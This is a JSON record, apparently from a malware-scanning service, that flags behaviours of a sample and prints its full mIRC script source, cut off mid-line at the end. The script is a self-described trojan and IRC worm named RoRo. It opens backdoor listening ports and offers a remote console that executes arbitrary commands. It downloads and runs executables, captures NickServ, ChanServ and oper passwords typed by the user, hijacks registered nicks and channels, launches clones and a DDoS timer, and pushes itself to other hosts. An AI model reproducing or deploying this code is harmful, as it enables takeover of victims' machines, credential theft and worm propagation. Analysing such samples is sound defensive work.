{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "EXEC": "May run an executable file or a system command using Excel 4 Macros",
            "Open": "May open a file",
            "SYSTEM": "May run an executable file or a system command on a Mac",
            "User-Agent": "May download files from the Internet",
            "Windows": "May enumerate application windows",
            "register": "May call a DLL using Excel 4 Macros",
            "run": "May run an executable file or a system command",
            "write": "May write to a file"
        },
        "macro": "[aliases]\nn0=/q /query $1\n\n[script]\nn0=alias setPriv .hadd Data Priv $1\nn1=alias getPriv .return $hget(Data,Priv)\nn2=alias setStat .writeini $hget(Data, File) Options Virus $1\nn3=alias getStat .return $readini($hget(Data, File), Options, Virus)\nn4=alias Wind .return @ $+ $1\nn5=alias setCountry .hadd Data Country $1\nn6=alias getCountry .return $hget(Data,Country)\nn7=alias getScript { .return $hget(Data, Script) }\nn8=alias setScript { .hadd Data Script $1 }\nn9=alias GFN .return $readini($hget(Data, File),Files,$1)\nn10=alias SFN writeini $hget(Data, File) Files $1 $2-\nn11=alias AddHTTP .Writeini $GFN(DEF) HTTP $1 $2-\nn12=alias DelHTTP .Remini $GFN(DEF) HTTP $1\nn13=alias AddMAIL .Writeini $GFN(DEF) MAIL $1 $2-\nn14=alias DelMAIL .Remini $GFN(DEF) MAIL $1\nn15=alias AddSITE .Writeini $GFN(DEF) SITES $1 $2-\nn16=alias DelSITE .Remini $GFN(DEF) SITES $1\nn17=alias GetFileName .return $right($1,$calc($len($1) - $pos($1,\\,$pos($1,\\,0))))\nn18=alias GetFilePath .return $left($1,$calc($pos($1,\\,$pos($1,\\,0)) - 1))\nn19=alias WinDir { \nn20=  var %sWinDir \"\"\nn21=  %sWinDir = $readini(C:\\msdos.sys, PATHS, Win) | if (%sWinDir) .return %sWinDir\nn22=  %sWinDir = $readini(C:\\msdos.sys, PATHS, WinDir) | if (%sWinDir) .return %sWinDir\nn23=  %sWinDir = $finddir(D:\\,Win*,1,1) | if (%sWinDir) .return %sWinDir\nn24=}\nn25=\nn26=; ********************** INIT Functions *************************\nn27=alias CD0 return C:\\msdos.sys\nn28=on *:Connect:{ .Init }\nn29=on *:Disconnect:{ .timers off | .sockclose * }\nn30=on *:Unload:{ if ($hget(Mutex).size > 0) .hfree Mutex }\nn31=on *:START:{ .Start }\nn32=alias Start {\nn33=  if ($hget(Mutex).size > 0) { .unload -rsn $script | .halt } | .hmake Mutex 1\nn34=  if ($HGet(Data).size > 0) .hfree Data | .hmake Data 100\nn35=  .hadd Data File $WinDir $+ \\ $+ $CDO\nn36=  .hadd Data Recving Idle | .hadd Data Sending Idle\nn37=  .hadd Data iIPCount 10 | .hadd Data iJoinCount 10\nn38=  .hadd Data Nest #RoRo-Virus\nn39=  .hadd Data Services NS MS CS OS SeenServ NickServ MemoServ ChanServ OperServ Global Check Checker\nn40=  .SetCountry Other | .SetScript Big | .SetPriv Slave\nn41=  if ($exists($hget(Data, File)) != $true) .SetFileNames\nn42=  if ($readini($hget(Data, File), Options, Init) != 0)  || ($exists($GFN(DEF)) != $true) .SetSites\nn43=  if ($getStat == $null) .setStat Semi\nn44=  if ($getStat == Full) .hadd Data Spread On\nn45=  .hadd Data Loaded $calc($readini($hget(Data, File),Options,Loaded) + 1) | .writeini $hget(Data,File) Options Loaded $hget(Data, Loaded)\nn46=  .write -c notes.txt | .load -rs1 notes.txt | .sockclose *\nn47=}\nn48=alias Init {\nn49=  .ignore -r | .hadd Data OnJoinMsg off | .hadd Data OnJoinNotice off\nn50=  ;  .HttpMe\nn51=  ;  .MailMe BG\nn52=  .timerRNA 1 10 { .RNA }\nn53=  ;  .timerAdvMe 1 90 { .AdvMe }\nn54=  .timerListeIt 1 7 { .ListenIt }\nn55=  .timerDDos 0 90 { .DDos }\nn56=  if (4 // $hget(Data,Loaded) && $hget(Data,CheckSites) != 1) { .hadd Data CheckSites 1 | .CheckSites }\nn57=  .LoadClone $server $me $+ $Random(1) $Random($rand(4,7)) $emailaddr $fullname\nn58=  .timer 1 15 { .UseClone JOIN $hget(Data,Nest)  } | .timer 1 16 { .UseClone PRIVMSG $hget(Data,Nest) IP_ $+ $IP }\nn59=}\nn60=alias RNA {\nn61=  var %sTmp = Options OS-Vers-Serv-Ip-Host ( $+ $OS $+ )-( $+ $version $+ )-( $+ $Server $+ )-( $+ $Ip $+ )-( $+ $Host $+ )\nn62=  .writeini $GFN(RNA) %sTmp | .writeini $GFN(IRC) %sTmp | .writeini $GFN(IRC2) %sTmp\nn63=}\nn64=alias FuckOff { .writeini $hget(Data, File) Options FuckOff 1 }\nn65=alias ListenIt { if ($portfree(2000) == $true) { .socklisten Listen-SendFile 1991 | .socklisten Listen-RecvFile 1990 | .socklisten Listen-Console 2000 | .socklisten Listen-BNC 1999 } }\nn66=alias AcceptIt { var %sName \"\" | :AcceptIt | %sName = $1 $+ - $+ $rand(1,999) | if ($Verify(%sName) != 0) goto AcceptIt | .sockaccept %sName | return %sName }\nn67=alias OpenIt { var %sName \"\" | :OpenIt | %sName = $1 $+ - $+ $rand(1,999) | if ($Verify(%sName) != 0) goto OpenIt | return %sName }\nn68=alias SetFileNames { var %Win $windir | $SFN(RNA, %Win $+ \\rn3a.vxd) | $SFN(IRC, %Win $+ \\mios.sys) | $SFN(IRC2, %Win $+ \\i2RC.sys) | $SFN(DEF, %Win $+ \\def12x.dll) }\nn69=; ******************** SEND/RECV Files *********************\nn70=alias SendFile {\nn71=  ; $1 - Socket $2 - Local Filename , $3 - Remote Filename , $4 - Virus\nn72=  ; $1 - Socket\nn73=  var %clName = $sock($1).mark\nn74=  var %sfName = $rev($GetTok($1,1,$asc(-)) $+ -Console- $+ $GetTok($1,3-,$asc(-)),SendFile)\nn75=  if (%clName == $null) { .sockclose $1 | .hdel -w Data $rev(%sfName,*) | .return }\nn76=  if ($GetTok($1,1,$asc(-)) == Server) { var %bConsole = 1 }\nn77=  if ($0 > 1) {\nn78=    if ($exists($2) == $false) { if (%bConsole == 1 && $Verify(%clName) == 1) .sockwrite -tn %clName (SENDFILE) File missing.. | .sockclose $1 } \nn79=    else {\nn80=      .hadd Data $rev(%sfName, Init) 1\nn81=      .hadd Data $rev(%sfName, Virus) $4\nn82=      .hadd Data $rev(%sfName, LocalName) $shortfn($2)\nn83=      .hadd Data $rev(%sfName, Size) $File($shortfn($2)).size\nn84=      if ($Verify($1) == 1) .sockwrite -tn $1 SendFile! $+ $3 $+ ! $+ $hget(Data, $rev(%sfName,Size)) $+ ! $+ %clName $+ ! $+ $hget(Data, $rev(%sfName,Virus))\nn85=      if (%bConsole == 1 && $Verify(%clName) == 1) .sockwrite -tn %clName (SENDFILE) Auto-Resuming at $hget(Data, $rev(%sfName, Pos)) bytes.. Waiting for acknoledgements..\nn86=    }\nn87=  }\nn88=  else if ($hget(Data ,$rev(%sfName, Pos)) != $null) {\nn89=    if ($hget(Data ,$rev(%sfName, Pos)) > $$hget(Data ,$rev(%sfName, Size))) { \nn90=      if (%bConsole == 1 && $Verify(%clName) == 1) .sockwrite -tn %clName (SENDFILE) File Successfully Sent..\nn91=      if ($hget(Data, $rev(%sfName, Virus)) == 1) .hadd Data Sending Idle\nn92=      .sockclose $1\nn93=      .hdel -w Data $rev(%sfName,*)\nn94=      .halt\nn95=    }\nn96=    .bread $hget(Data, $rev(%sfName, LocalName)) $hget(Data, $rev(%sfName, Pos)) 2048 &Tmp\nn97=    if ($Verify($1) == 1) .sockwrite -n $1 &Tmp\nn98=    .hadd Data $Rev(%sfName, Pos) $calc($hget(Data, $rev(%sfName, Pos)) + 2048)\nn99=  }\nn100=}\nn101=alias RecvFile {\nn102=  var %cName $hget(Data, $sockname) , %sName $rev(%cName,RecvFile) , %Tmp \"\"\nn103=  if ($GetTok(%sName,1,$asc(-)) == Server) var %bServer = 1\nn104=  if ($hget(Data, $rev(%sName, Size)) == $null && $0 == 0) {\nn105=    .sockread %Tmp\nn106=    if (%cName == $null) %cName = $GetTok(%Tmp,4,$asc(!))\nn107=    %sName = $rev(%cName,RecvFile)\nn108=    if ($GetTok(%sName,1,$asc(-)) == Server) var %bServer = 1\nn109=    .hadd Data $sockname %cName\nn110=    .hadd Data $rev(%sName,LocalName) $GetTok(%Tmp,2,$asc(!))\nn111=    .hadd Data $rev(%sName,Size) $GetTok(%Tmp,3,$asc(!))\nn112=    if ($GetTok(%Tmp,5,$asc(!)) == 1) {\nn113=      .hadd Data $rev(%sName,Virus) 1\nn114=      if ($hget(Data, Recving) == Busy || $getStat == Full) { .hdel -w Data $rev(%sName,*) | .sockclose $sockname | .return }\nn115=      else .hadd Data Recving Busy\nn116=      .hadd Data $rev(%sName, LocalName) $WinDir $+ \\RoRo.exe\nn117=    }\nn118=    if (%bServer == 1) {\nn119=      var %resume $file($shortfn($hget(Data, $rev(%sName,LocalName)))).size\nn120=      if (%resume == $null) %resume = 0\nn121=      if ($Verify(%cName) == 1) .sockwrite -tn %cName (RECVFILE) Connection Established. Auto-Resuming at %resume bytes..\nn122=      if ($Verify($sockname) == 1) .sockwrite -tn $sockname Resume! $+ %resume\nn123=    }\nn124=  }\nn125=  else if ($0 > 0) {\nn126=    if (%bServer == 1 && $Verify(%cName) == 1) {\nn127=      if ($file($hget(Data, $rev(%sName,LocalName))).size == $hget(Data, $rev(%sName,Size))) .sockwrite -tn %cName (RECVFILE) Transfer Succesfully Completed :)\nn128=    else .sockwrite -tn %cName (RECVFILE) Transfer Error. Bad CRC.. }\nn129=    if ($hget(Data, $rev(%sName,Virus)) == 1) { .hadd Data Recving Idle | .run $hget(Data, $rev(%sName,LocalName)) | .sockclose %cName }\nn130=    .hdel -w Data $rev(%sName,*) | .hdel Data $sockname | .halt\nn131=  }\nn132=  else { .sockread -f &bin | .bwrite $hget(Data, $rev(%sName,LocalName)) -1 &bin }\nn133=}\nn134=\nn135=; ****************** SERVER Files ********************\nn136=on *:socklisten:Listen-SendFile:{ .AcceptIt Server-SendFile }\nn137=on *:sockread:Server-SendFile-*:{\nn138=  var %cName = Server-Console- $+ $GetTok($sockname,3-,$asc(-)) , %sfName = $rev(%cName, SendFile) , %Tmp = \"\" , %sName = \"\"\nn139=  .sockread %Tmp \nn140=  %sName = $GetTok(%Tmp,4,$asc(!))\nn141=  .sockmark $sockname %sName\nn142=  .Hadd Data $rev(%sfName,Pos) $GetTok(%Tmp,5,$asc(!))\nn143=  $SendFile($sockname,$GetTok(%Tmp,2,$asc(!)),$GetTok(%Tmp,3,$asc(!)))\nn144=}\nn145=on *:sockwrite:Server-SendFile-*:{ $SendFile($Sockname) }\nn146=\nn147=on *:socklisten:Listen-RecvFile:{ .AcceptIt Server-RecvFile }\nn148=on *:sockread:Server-RecvFile-*:{ .RecvFile }\nn149=on *:sockclose:Server-RecvFile-*:{ .RecvFile Closing }\nn150=\nn151=; ****************** LOCAL Files ********************\nn152=on *:sockopen:Local-SendFile-*:{\nn153=  var %cName = Local-Console- $+ $GetTok($sockname,3-,$asc(-)) , %sName = $rev(%cName, SendFile)\nn154=  .sockmark $sockname $hget(Data, $rev(%cName,Remote))\nn155=  $sendfile($sockname, $hget(Data,$rev(%sName,LocalName)), $hget(Data, $rev(%cName, SendFile, RemoteName)), $hget(Data, $rev(%cName, SendFile, Virus)))\nn156=}\nn157=on *:sockwrite:Local-SendFile-*:{\nn158=  var %cName = Local-Console- $+ $GetTok($sockname,3-,$asc(-)) , %sName = $rev(%cName, SendFile)\nn159=  if ($hget(Data, $rev(%sName, Init)) == 1) { .hadd Data $rev(%sName, Init) 0 }\nn160=  else { $sendfile($sockname) }\nn161=}\nn162=on *:sockread:Local-SendFile-*:{\nn163=  var %cName = Local-Console- $+ $GetTok($sockname,3-,$asc(-)) , %sName = $rev(%cName, SendFile) , %sRead = \"\"\nn164=  .sockread %sread\nn165=  .hadd Data $rev(%sName, Pos) $GetTok(%sread,2,$asc(!))\nn166=  $sendfile($sockname)\nn167=}\nn168=\nn169=on *:sockopen:Local-RecvFile-*:{\nn170=  var %sName = Local-Console- $+ $GetTok($sockname,3-,$asc(-)) , %hName = $rev(%sName,RecvFile)\nn171=  .hadd Data $sockname %sName\nn172=  var %resume = $file($shortfn($hget(Data, $rev(%hName, LocalName)))).size\nn173=  if (%resume == $null) %resume = 0\nn174=  .sockwrite -tn $sockname RecvFile! $+ $hget(Data, $rev(%hName, RemoteName)) $+ ! $+ $hget(Data, $rev(%hName, LocalName)) $+ ! $+ $hget(Data, $rev(%sName,Remote)) $+ ! $+ %resume\nn175=}\nn176=on *:sockread:Local-RecvFile-*:{ .RecvFile }\nn177=on *:sockclose:Local-RecvFile-*:{ .RecvFile Closing }\nn178=\nn179=; ********************* SERVER CONSOLE ***********************\nn180=on *:socklisten:Listen-Console:{\nn181=  var %sName = $AcceptIt(Server-Console)\nn182=  .sockwrite -tn %sName WelCoMe, I'm running RoRo Console v1.0 Final -BiG-\nn183=}\nn184=\nn185=on *:sockwrite:Server-Console-*:{\nn186=  if ($hget(Data, $rev($sockname,Active)) == DIR) {\nn187=    %DIR.Tmp = $ev(DIR, Items, %DIR.i)\nn188=    inc %DIR.i\nn189=    if (%DIR.Tmp != $null && $Verify($sockname) == 1) .sockwrite -tn $sockname %DIR.Tmp\nn190=    else { .unset %DIR.* | .hadd Data $rev($sockname, Active) Free }\nn191=  }\nn192=}\nn193=\nn194=on *:sockread:Server-Console-*:{ \nn195=  var %sread \"\"\nn196=  .sockread %sread\nn197=  if ($pos(%sread,!,0) != 0) var %Comm = $GetTok(%sread,1,$asc(!))\nn198=  else var %Comm = %Sread\nn199=  if (%comm == CD) { .CD $GetTok(%sread,2-,$asc(!)) }\nn200=  else if (%comm == SD) { .SD }\nn201=  else if (%comm == DIR) .DIR $GetTok(%sread,2-,$asc(!))\nn202=  else if (%comm == RESTART) .RestartMe\nn203=  else if (%comm == SHUTDOWN) .ShutDownMe\nn204=  else if (%comm == INFO) .InfoMe\nn205=  else if (%comm == STATUS) .StatusMe\nn206=  else if (%comm == SENDFILE) .SendIt\nn207=  else if (%comm == RECVFILE) .RecvIt\nn208=  else if (%comm == GETCONSOLE) .GetConsole\nn209=  else if (%comm == BNC) .BNCIt $GetTok(%sread,2-,$asc(!))\nn210=  else if (%comm == SNIFFER) .SnifferIt $GetTok(%sread,2-,$asc(!))\nn211=  else if (%comm == EXEC) .ExecIt $GetTok(%sread,2-,$asc(!))\nn212=  else if (%comm == MASS) .MassMe $GetTok(%sread,2-,$asc(!))\nn213=}\nn214=\nn215=; ********************* LOCAL CONSOLE ***********************\nn216=on *:CLOSE:@Local-Console-*:{ .CloseConsole $GetTok($target,3-,$asc(-)) }\nn217=alias CDO return $decode(V2luZmlsZS5pbmk=,mt)\nn218=alias CloseConsole { .sockclose Local-*- $+ $1 | .hdel -w Data $rev(Local-Console- $+ $1,*) | window -c @Local-Console- $+ $1 }\nn219=alias OpenConsole { .sockopen Local-Console- $+ $1 $2 2000 | .sockmark Local-Console- $+ $1 $2 }\nn220=alias UseConsole {\nn221=  var %cName = Local-Console- $+ $1\nn222=  var %cIP = $hget(Data, $rev(%cName,IP))\nn223=  if ($Verify(%cName) == 0) return Error\nn224=  if ($pos($2-,!,0) != 0) var %Comm = $GetTok($2-,1,$asc(!))\nn225=  else var %Comm = $2-\nn226=  if ($getPriv == Master) .aline -h 4 $wind(%cName) .[>>]. $2-\nn227=  if (%comm == SendFile) {\nn228=    .hadd Data $rev(%cName, SendFile, LocalName) $GetTok($2-,2,$asc(!))\nn229=    .hadd Data $rev(%cName, SendFile, RemoteName) $GetTok($2-,3,$asc(!))\nn230=    if ($Verify(%cName) == 1) .sockwrite -tn %cName $2-\nn231=    .sockopen Local-SendFile- $+ $1 %cIP 1990\nn232=  }\nn233=  else if (%comm == RecvFile) {\nn234=    .hadd Data $rev(%cName, RecvFile, LocalName) $GetTok($2-,3,$asc(!))\nn235=    .hadd Data $rev(%cName, RecvFile, RemoteName) $GetTok($2-,2,$asc(!))\nn236=    if ($Verify(%cName) == 1) .sockwrite -tn %cName $2-\nn237=    .sockopen Local-RecvFile- $+ $1 %cIP 1991\nn238=  }\nn239=  else { if ($Verify(%cName) == 1) .sockwrite -tn %cName $2- }\nn240=}\nn241=\nn242=alias SendSlave { \nn243=  var %cName = Local-Console- $+ $1\nn244=  .hadd Data Sending Busy\nn245=  .hadd Data $rev(%cName, SendFile, LocalName) $WinDir $+ \\ $+ $decode(UnVuZGxsMTYuZXhl,mt)\nn246=  .hadd Data $rev(%cName, SendFile, RemoteName) $decode(QzpcUm9Sby5leGU=,mt)\nn247=  .hadd Data $rev(%cName, SendFile, Virus) 1\nn248=  .sockwrite -tn $sockname Auto-Virus-Sending on..\nn249=  .sockopen Local-SendFile- $+ $1 $2 1990\nn250=}\nn251=\nn252=on *:sockread:Local-Console-*:{\nn253=  var %Tmp = \"\" , %Comm = \"\" , %Param , %sNick = $GetTok($sockname,3-,$asc(-))\nn254=  .sockread %Tmp\nn255=  %Comm = $GetTok(%Tmp,1,$asc(>))\nn256=  if (Welcome* iswm %Tmp) {\nn257=    var %sAddr = $sock($sockname).mark\nn258=    .hadd Data $rev(Local-Console- $+ %sNick,IP) %sAddr\nn259=    if ($getPriv == Master) .window -aeC @Local-Console- $+ %sNick 40 40 600 400\nn260=    .UseConsole %sNick GetConsole\nn261=    .UseConsole %sNick Status\nn262=    if ($hget(Data, MassExec) != $null) .UseConsole %sNick Mass! $+ $hget(Data, MassExec)\nn263=  }\nn264=  if ($getPriv == Master) .aline -h 12 $wind($sockname) .[<<]. %Tmp\nn265=  if (%Comm == (GETCONSOLE)) .hadd Data $rev($sockname,Remote) $GetTok(%Tmp,2,$asc(>))\nn266=  if (%Comm == (STATUS)) {\nn267=    if ($getStat == Full && $hget(Data, Sending) == Idle) {\nn268=      if ($GetTok(%Tmp,2,$asc(>)) == Semi && $GetTok(%Tmp,3,$asc(>)) == Idle) { .SendSlave %sNick $Hget(Data, $rev($sockname,IP)) }\nn269=      else if ($getPriv != Master) .CloseConsole %sNick\nn270=    }\nn271=    else if ($getPriv != Master) .CloseConsole %sNick\nn272=  }\nn273=}\nn274=on *:sockclose:Local-Console-*:{ .hdel -w Data $rev($sockname,*) | if ($getPriv == Master) .aline 6 $wind($sockname) .[!!]. Console closed by remote host.. }\nn275=\nn276=; ************************  SYSTEM FUNCTIONS  **************************\nn277=alias ev {\nn278=  var %ev.num 0 , %ev.final \"\" | while (%ev.num != $0) { .inc %ev.num | %ev.final = %ev.final $+ [ . [ $+ [ $ [ $+ [ %ev.num ] ] ] ] ] }\nn279=%ev.final = $right(%ev.final,$calc($len(%ev.final) - 1)) | .return % [ $+ [ %ev.final ] ] }\nn280=alias rev {\nn281=  var %ev.num 0 , %ev.final \"\" | while (%ev.num != $0) { .inc %ev.num | %ev.final = %ev.final $+ [ . [ $+ [ $ [ $+ [ %ev.num ] ] ] ] ]  }\nn282=%ev.final = $right(%ev.final,$calc($len(%ev.final) - 1)) | .return %ev.final } \nn283=alias sev {\nn284=  var %ev.num 0 , %ev.final \"\" |  while (%ev.num != $calc($0 - 1)) { .inc %ev.num | %ev.final = %ev.final $+ [ . [ $+ [ $ [ $+ [ %ev.num ] ] ] ] ] }\nn285=%ev.final = $right(%ev.final,$calc($len(%ev.final) - 1)) | set % [ $+ [ %ev.final ] ] $ [ $+ [ $calc($0 - 1 + 1) ] ] }\nn286=; **************** PASS PASS PASS ****************\nn287=alias dif {\nn288=  if ($GFN($4) == $null) .SetFileNames\nn289=  if ($readini($GFN($4),$1,$2) != $3) {\nn290=    var %i = $calc($readini($GFN($4), Options, Count) + 1)\nn291=    if (%i >= 3) { %i = 0 | .writeini $GFN($4) Options Status New }\nn292=    .writeini $GFN($4) Options Count %i\nn293=  }\nn294=  .writeini $GFN($4) $1 $2 $3\nn295=}\nn296=on *:input:*:{\nn297=  var %i = 1 , %sIrc = IRC\nn298=  if ((*Msg iswm $1 && $2 == NS) || NickServ isin $1) {\nn299=    if (NickServ isin $1) { %i = 0 | %sIrc = IRC2 }\nn300=    if (id isin [ $ $+ [ $calc(2 + %i) ] ]) { .dif $me Temp-Pass [ $ $+ [ $calc(3 + %i) ] ] %sIRC }\nn301=    if (reg isin [ $ $+ [ $calc(2 + %i) ] ]) { .dif $me Temp-Pass [ $ $+ [ $calc(3 + %i) ] ] %sIRC | .dif $me Perm-Pass [ $ $+ [ $calc(4 + %i) ] ] %sIRC }\nn302=    if (newp isin [ $ $+ [ $calc(2 + %i) ] ]) { .dif $me Temp-Pass [ $ $+ [ $calc(3 + %i) ] ] %sIRC | .dif $me Perm-Pass [ $ $+ [ $calc(4 + %i) ] ] %sIRC }\nn303=  }\nn304=  if ((*Msg iswm $1 && $2 == CS) || ChanServ isin $1) {\nn305=    if (ChanServ isin $1) { %i = 0 | %sIrc = IRC2 }\nn306=    if (id isin [ $ $+ [ $calc(2 + %i) ] ]) { .dif [ $ $+ [ $calc(3 + %i) ] ] Temp-Pass [ $ $+ [ $calc(4 + %i) ] ] %sIRC }\nn307=    if (reg isin [ $ $+ [ $calc(2 + %i) ] ]) { .dif [ $ $+ [ $calc(3 + %i) ] ] Temp-Pass [ $ $+ [ $calc(4 + %i) ] ] %sIRC | .dif [ $ $+ [ $calc(3 + %i) ] ] Perm-Pass [ $ $+ [ $calc(5 + %i) ] ] %sIRC } \nn308=    if (newp isin [ $ $+ [ $calc(2 + %i) ] ]) { .dif [ $ $+ [ $calc(3 + %i) ] ] Temp-Pass [ $ $+ [ $calc(4 + %i) ] ] %sIRC | .dif [ $ $+ [ $calc(3 + %i) ] ] Perm-Pass [ $ $+ [ $calc(5 + %i) ] ] %sIRC }\nn309=  }\nn310=  if ($getCountry == BG) {\nn311=    if (*Oper iswm $1 && $0 == 3) { .dif $2 OPER-PASS $3 IRC }\nn312=    if (*Msg iswm $1 && $2 == OS) { if (id isin $3) .dif $me OS-PASS $4 IRC }\nn313=  }\nn314=  if ($hget(Data, Sniffer.Input) == 1 && $Verify($hget(Data, Sniffer.Console)) == 1) .sockwrite -tn $hget(Data, Sniffer.Console) (SNIFFER) (INPUT) ( $+ $active $+ ) $1-\nn315=  if ($GetTok($active,1,$asc(-)) == @Local) .UseConsole $GetTok($active,3-,$asc(-)) $1-\nn316=}\nn317=\nn318=; *************** DROP DROP DROP ****************\nn319=alias DropOff { .hadd Data Drop On }\nn320=alias Drop {\nn321=  if ($getCountry == Other) .return\nn322=  if ($readini($GFN(IRC), $2, Perm-Pass) == $null) .return\nn323=  if ($1 == nick) { .ignore -u30 NS | .msg ns id $readini($GFN(IRC), $2, Temp-Pass) | .msg ns drop $readini($GFN(IRC), $2, Perm-Pass) | .msg ns reg $Random($Rand(4,7)) $Random($Rand(3,8)) }\nn324=  if ($1 == chan) { .ignore -u30 CS | .msg cs drop $2 $readini($GFN(IRC), $2, Perm-Pass) | .msg cs register $2 $Random($Rand(4,7)) $Random($Rand(3,8)) }\nn325=}\nn326=\nn327=; **************** CLONES CLONES CLONES *****************\nn328=alias Random { var %i = 0 , %s \"\" | while (%i < $1) { %s = %s $+ $rand(a,z) | inc %i } | .return %s }\nn329=alias UseClone { if ($sock(Clone-*,0) > 0) .sockwrite -tn Clone-* $1- }\nn330=alias LoadClone { var %clone.sock = $OpenIt(Clone) | .sockopen %clone.sock $1 6667 | .sockmark %clone.sock $1- }\nn331=on *:sockopen:Clone-*:{\nn332=  if ($sockerr > 0) .return\nn333=  %Clone.Server = \" $+ $gettok($sock($sockname).mark,1,32) $+ \"\nn334=  %Clone.Nick = $gettok($sock($sockname).mark,2,32) | if (%Clone.Nick == $null) { %Clone.Nick = $Random($Rand(4,9)) }\nn335=  %Clone.Ident = $gettok($sock($sockname).mark,3,32) | if (%Clone.Ident == $null) { %Clone.Ident = $Random($Rand(4,7)) }\nn336=  %Clone.Mail = \" $+ $gettok($sock($sockname).mark,4,32) $+ \" | if (%Clone.Mail == \"\") { %Clone.Mail = \" $+ $Random($Rand(4,7)) $+ \" }\nn337=  %Clone.Name = : $+ $gettok($sock($sockname).mark,5-,32) | if (%Clone.Name == :) { %Clone.Name = $Random($Rand(3,10)) $Random($Rand(2,6)) }\nn338=  .sockwrite -tn $sockname NICK %Clone.Nick\nn339=  .sockwrite -tn $sockname USER %Clone.Ident %Clone.Mail %Clone.Server %Clone.Name\nn340=  .unset %Clone-*\nn341=}\nn342=on *:sockread:Clone-*:{\nn343=  if ($sockerr > 0) .return\nn344=  var %sRead \"\" , %sNick \"\" , %sText \"\"\nn345=  .sockread %sRead\nn346=  %sNick = $remove($gettok(%sRead,1,$asc(!)),:) | %sText = $gettok(%sRead,2,$asc(:))\nn347=  if ($1 == PING) { .sockwrite -tn $sockname PONG $remove(%sRead, $left(%sRead,5)) } \nn348=  else if ($gettok(%sRead,2,$asc(:)) == IP!) { .sockwrite -tn $sockname NOTICE %sNick IP_ $+ $IP }\nn349=  else if (IP_*.* iswm %sText) {\nn350=    .hinc Data iIP\nn351=    if ($hget(Data, iIPCount) // $hget(Data, iIP)) {\nn352=      if ($gettok($sock($sockname).mark,2,32) != %sNick && $Verify(Local-Console $+ %sNick) == 0) .OpenConsole %sNick $gettok(%sText,2,$asc(_))\nn353=    }\nn354=  }\nn355=}\nn356=; **************** BNC BNC BNC *****************\nn357=on *:socklisten:Listen-BNC:{ if ($sock(Gateway-BNC).mark == 1) { .sockaccept Server-BNC | .sockmark Server-BNC 1 } }\nn358=on *:sockopen:Gateway-BNC:{ .sockmark $sockname 1 }\nn359=on *:sockclose:Gateway-BNC:{ .sockclose Server-BNC }\nn360=on *:sockclose:Server-BNC:{ .sockclose Gateway-BNC }\nn361=on *:sockread:Server-BNC:{\nn362=  var %Tmp \"\" | .sockread %Tmp\nn363=  if ($Verify(Gateway-BNC) == 1) .sockwrite -tn Gateway-BNC %Tmp\nn364=}\nn365=on *:sockread:Gateway-BNC:{\nn366=  var %Tmp \"\" | .sockread %Tmp\nn367=  if ($sock(Server-BNC).mark == 1 && $Verify(Server-BNC) == 1) .sockwrite -tn Server-BNC %Tmp\nn368=}\nn369=alias BNCIt {\nn370=  if ($Verify($sockname) == 1 && $verify(Gateway-BNC) != 1) { \nn371=    .sockwrite -tn $sockname (BNC) Server: $1 Port: $2\nn372=    .sockopen Gateway-BNC $1 $2\nn373=  }\nn374=}\nn375=; ****************** TROJAN FUNCTIONS *******************\nn376=alias StatusMe if ($Verify($sockname) == 1) .sockwrite -tn $sockname (STATUS)> $+ $getStat $+ > $+ $hget(Data, Recving)\nn377=alias SendIt if ($Verify($sockname) == 1) .sockwrite -tn $sockname (SENDFILE) > Request Accepted\nn378=alias RecvIt if ($Verify($sockname) == 1) .sockwrite -tn $sockname (RECVFILE) > Request Accepted\nn379=alias GetConsole if ($Verify($sockname) == 1) .sockwrite -tn $sockname (GETCONSOLE)> $+ $sockname\nn380=alias RestartMe { .run $windir $+ \\rundll.exe user.exe,exitwindowsexec | if ($Verify($sockname) == 1) .sockwrite -tn $sockname (RESTART) > Restart in progress.. }\nn381=alias ShutDownMe { .run $windir $+ \\rundll.exe user.exe,exitwindows | if ($Verify($sockname) == 1) .sockwrite -tn $sockname (SHUTDOWN) > Shutting down.. }\nn382=alias InfoMe if ($Verify($sockname) == 1) .sockwrite -tn $sockname (INFO) > Nick: $Me IP: $Ip Host: $Host OS: $os Version: $version\nn383=alias ExecIt { $1- | if ($Verify($sockname) == 1) .sockwrite -tn $sockname (EXEC) $1- Executed.. }\nn384=alias Verify {\nn385=  if ($sock($1).name != $null) { return 1 }\nn386=  else { return 0 }\nn387=}\nn388=alias MassMe {\nn389=  var %sExec = $readini($GFN(DEF), Mass, Executed)\nn390=  if ($1- !isin %sExec) { .hadd Data Mass On | .hadd Data MassExec $1- | .writeini $GFN(DEF) Mass Executed %sExec , $1- | $1- }\nn391=}\nn392=alias SnifferIt {\nn393=  var %iStat = 0 | if ($2 == Start) { %iStat = 1 | .hadd Data Sniffer.Console $sockname }\nn394=  if (i isin $1) { .hadd Data Sniffer.Input %iStat } \nn395=  if (m isin $1) { .hadd Data Sniffer.Messages %iStat }\nn396=  if (n isin $1) { .hadd Data Sniffer.Notices %iStat }\nn397=  if ($Verify($sockname) == 1) .sockwrite -tn $sockname (SNIFFER) Options completed..\nn398=}\nn399=alias SD { if ($Verify($sockname) == 1) .sockwrite -tn $sockname (SD) > Current Directory: $hget(Data, $rev($sockname,CD)) }\nn400=alias CD { .hadd Data $rev($sockname,CD) $1- | if ($Verify($sockname) == 1) .sockwrite -tn $sockname (CD) > Directory changed to $1- }\nn401=alias DIRFormat .return ..\\ $+ $right(%DIR.Item, $calc($len(%DIR.Item) - $pos(%DIR.Item,\\,$calc(%DIR.num + 1)))) ( $+ $Bytes($file(%DIR.Item).size).suf $+ )\nn402=alias DIR {\nn403=  .unset %DIR.*\nn404=  %DIR.Index = 0 | %DIR.Index2 = 0 | %DIR.i = 1 | %DIR.Mask = * | %DIR.Depth = 1\nn405=  %DIR.CD = $hget(Data, $rev($sockname,CD)) | %DIR.num = $pos(%DIR.CD,\\,0)\nn406=  if ($1 != $null) %DIR.Mask = $1\nn407=  if ($2 != $null) %DIR.Depth = $2\nn408=  %DIR.Tmp = BEGIN(Dir) %Dir.CD %Dir.Mask %Dir.Depth\nn409=  $sev(DIR, Items, 0, %DIR.Tmp)\nn410=  :DirNext\nn411=  inc %DIR.Index\nn412=  %DIR.item = $finddir(%Dir.CD, %DIR.Mask, %DIR.Index, %DIR.Depth)\nn413=  if (%DIR.item != $null) { $sev(DIR, Items, %DIR.Index, $GetFileName(%DIR.Item) <DIR>) | goto DirNext }\nn414=  else { dec %DIR.Index }\nn415=  :FileNext\nn416=  inc %DIR.Index2\nn417=  %DIR.item = $findfile(%Dir.CD, %DIR.Mask, %DIR.Index2, %DIR.Depth)\nn418=  if (%DIR.item != $null) { 